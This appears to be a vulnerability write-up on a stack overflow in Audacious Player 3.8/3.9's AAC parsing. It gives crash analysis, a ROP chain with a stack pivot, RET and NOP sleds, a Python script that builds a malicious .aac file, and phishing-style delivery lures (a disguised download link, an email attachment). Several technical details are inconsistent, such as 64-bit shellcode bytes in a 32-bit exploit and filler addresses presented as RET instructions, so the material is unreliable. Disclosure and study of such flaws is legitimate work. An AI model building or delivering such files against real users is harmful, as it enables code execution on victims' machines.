## Introduction

During my security research on multimedia applications, I discovered a critical **stack overflow vulnerability** in **Audacious Player versions 3.8 and 3.9**. This vulnerability was uncovered through systematic fuzzing of `.aac` audio files using the **CERT BFF (Basic Fuzzing Framework)**, demonstrating how automated testing can reveal complex memory corruption issues in media parsing libraries.

The vulnerability enables **arbitrary code execution** with the privileges of the user running Audacious Player, exploitable through both local and remote file delivery mechanisms.

**Complete exploit code, proof-of-concept files, and technical analysis are available in the [GitHub repository](https://github.com/hdbreaker/Audacious-3.8-3.9-AAC-Stack-Overflow-RCE)**.

## Vulnerability Discovery

### Research Methodology

The vulnerability was discovered through a comprehensive fuzzing campaign targeting audio file parsers:

```bash
# CERT BFF Fuzzing Campaign
./bff --target audacious --file-type aac --iterations 10000 --seed-corpus samples/

# Crash analysis revealed EIP control in libaudco
# Further analysis of the crash dump:
gdb audacious core.dump
(gdb) info registers
eip: 0x41414141  # Controlled EIP overwrite
```

### Initial Crash Analysis

The initial crash analysis revealed several critical indicators:

![Debugging session showing register control](/assets/blog/images/Audacious_5.png)

- **EIP overwrite** with attacker-controlled data
- **Stack corruption** in the `libaudco` audio codec library
- **Recursive memcpy** operations without proper bounds checking
- **Cross-platform impact** affecting both Windows and Linux builds

## Technical Analysis

### Root Cause: Recursive memcpy Vulnerability

The vulnerability stems from a **recursive `memcpy` operation** in the `libaudco` library that lacks proper delimiter validation:

![Vulnerable memcpy operation](/assets/blog/images/Audacious_1.png)

```c
// Vulnerable code pattern in libaudco
void parse_aac_frame(char *input_buffer, size_t buffer_size) {
    char stack_buffer[1024];
    
    // Recursive memcpy without bounds checking
    while (parse_frame_data(input_buffer)) {
        memcpy(stack_buffer, input_buffer, frame_size);  // VULNERABILITY
        input_buffer += frame_size;
        // No delimiter check leads to stack overflow
    }
}
```

### Memory Corruption Analysis

The vulnerability provides exceptional control over the execution environment:

- **EIP Control**: Complete control over instruction pointer
- **EDI Control**: Destination index register manipulation
- **ESI Control**: Source index register manipulation  
- **EBP Control**: Base pointer manipulation
- **No SEH Corruption**: Structured Exception Handling remains intact

This level of control is uncommon in stack overflow vulnerabilities and significantly simplifies exploitation.

## Exploitation Strategy

### Target Environment Assessment

**Supported Platforms:**
- Windows (all versions: XP, 7, 8, 10)
- Linux (various distributions)
- **Primary PoC Target**: Windows 8/10 (minor gadget adjustments needed for Win7)

### Security Mitigation Analysis

The target modules present a favorable exploitation environment:

```bash
# Security feature analysis
Module: libaudco.dll
- ASLR: Disabled
- DEP: Disabled  
- Stack Canaries: Not present
- CFI: Not implemented

# This configuration enables direct stack shellcode execution
```

### Stack Pivot Challenge

Despite the favorable security posture, exploitation faces a **critical challenge**:

- **Thread Context**: Vulnerability occurs outside the main thread
- **Stack Layout**: Controlled registers point above current stack position
- **Solution Required**: Negative stack pivot to reach shellcode placement area

## Advanced ROP Chain Development

### Phase 1: Initial Register Setup

The exploit begins with a carefully crafted ROP chain using a `pushad; ret` gadget:

![First ROP gadget execution](/assets/blog/images/Audacious_2.png)

```assembly
; Initial ROP gadget - saves all registers to stack
; Address: 0x???????? (module-relative addressing)
pushad          ; Save EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
ret             ; Return to next ROP gadget
```

This gadget provides:
- **Controlled EBP**: Base pointer for stack frame manipulation
- **Controlled ESI**: Source for memory operations
- **Controlled EDI**: Destination for memory operations

### Phase 2: Stack Alignment

The second ROP gadget performs crucial stack context alignment:

```assembly
; Stack alignment gadget
; Address: 0x68832D18
push esp        ; Push current stack pointer
ret             ; Return using ESP as target address
```

This technique ensures that subsequent ROP gadgets execute in the correct stack context.

### Phase 3: Stack Pivot Execution

The critical stack pivot operation:

![Stack pivot execution](/assets/blog/images/Audacious_3.png)

```assembly
; Stack pivot gadget
; Address: 0x????????
sub esp, 0x1FF  ; Negative stack pivot (511 bytes)
ret             ; Return to pivoted stack location
```

**Pivot Analysis:**
- **Pivot Distance**: 511 bytes (0x1FF) negative offset
- **Target Area**: Reaches attacker-controlled stack region
- **Shellcode Placement**: Positioned within pivot range

### Phase 4: RET Sled Implementation

To enhance exploit reliability across different environments:

```assembly
; RET sled for reliable execution
; Multiple consecutive RET instructions
0x41414141: ret
0x41414142: ret  
0x41414143: ret
0x41414144: ret
; ... continues until NOP sled
```

The RET sled provides:
- **Execution Reliability**: Compensates for minor address variations
- **Environment Adaptation**: Works across different Windows versions
- **Shellcode Transition**: Smooth transition to NOP sled

![Shellcode execution environment](/assets/blog/images/Audacious_4.png)

## Shellcode Development

### NOP Sled Implementation

```assembly
; NOP sled for landing zone
nop             ; 0x90
nop             ; 0x90  
nop             ; 0x90
; ... (repeated for reliability)
```

### Payload Integration

The final shellcode follows standard exploitation patterns:

```assembly
; Example shellcode structure
; 1. Environment setup
; 2. API resolution (GetProcAddress, LoadLibrary)
; 3. Payload execution (reverse shell, message box, etc.)
; 4. Clean exit or persistence
```

## Proof of Concept Development

### Malicious AAC File Structure

The exploit requires a specially crafted `.aac` file:

```python
#!/usr/bin/env python
# Audacious AAC Exploit PoC

def create_malicious_aac():
    """
    Generate malicious AAC file for Audacious stack overflow
    """
    
    # AAC header structure
    aac_header = "AAC_HEADER_MAGIC"
    
    # ROP chain payload
    rop_chain = struct.pack('<I', 0x????????)  # pushad; ret
    rop_chain += struct.pack('<I', 0x68832D18)  # push esp; ret
    rop_chain += struct.pack('<I', 0x????????)  # sub esp, 0x1FF; ret
    
    # RET sled
    ret_sled = struct.pack('<I', 0x????????) * 20
    
    # NOP sled
    nop_sled = "\x90" * 100
    
    # Shellcode (calculator pop for PoC)
    shellcode = "\xfc\x48\x83\xe4\xf0..."  # msfvenom payload
    
    # Buffer overflow trigger
    overflow_data = "A" * 1024  # Trigger stack overflow
    overflow_data += rop_chain
    overflow_data += ret_sled  
    overflow_data += nop_sled
    overflow_data += shellcode
    
    return aac_header + overflow_data

# Generate malicious file
with open("malicious.aac", "wb") as f:
    f.write(create_malicious_aac())
```

### Delivery Mechanisms

**Local Exploitation:**
```bash
# Direct file execution
audacious malicious.aac
```

**Remote Exploitation:**
```html
<!-- Web-based delivery -->
<a href="malicious.aac" download>Download Music File</a>

<!-- Email attachment vector -->
Subject: New Music Collection
Attachment: song.aac (malicious.aac renamed)
```
